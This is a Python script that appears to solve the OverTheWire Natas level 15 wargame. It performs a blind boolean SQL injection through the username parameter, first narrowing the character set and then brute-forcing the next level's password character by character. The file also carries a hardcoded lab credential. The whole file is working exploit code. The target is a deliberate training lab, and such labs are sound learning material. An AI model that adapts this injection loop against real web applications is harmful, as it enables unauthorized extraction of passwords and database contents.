import requests
import string

url = "http://natas15.natas.labs.overthewire.org"
username = "natas15"
password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

#characters = abcdefghijklmnopqrstuvwxyzABCDEFGH
# IJKLMNOPQRSTUVWXYZ0123456789
characters = ''.join([string.ascii_letters,string.digits])

pass_dict = []
exits_str = "This user exists."
for char in characters:
    uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"%',char,'%','&debug'])
    r = requests.get(uri, auth=(username,password))
    if exits_str in r.text:
        pass_dict.append(char)
        #print(f"Password dict: {''.join(pass_dict)}")
print("Complete")
print(f"Dict: {''.join(pass_dict)}")

#Brute Force
print("Burte Forcing.....")
pass_list = []
passwd = ''
for i in range (1, 33):
    for char in pass_dict:
        test = ''.join([passwd,char])
        print(test)
        # Build GET requests
        uri = ''.join([url,'?','username=natas16"','+and+password+LIKE+BINARY+"',test,'%','&debug'])
    
        r = requests.get(uri,auth=(username,password))
        #print(r.text[:10])
        if exits_str in r.text:
            pass_list.append(char)
            passwd = ''.join(pass_list)
            print(f"Length: {len(passwd)}, Passworld: {passwd}")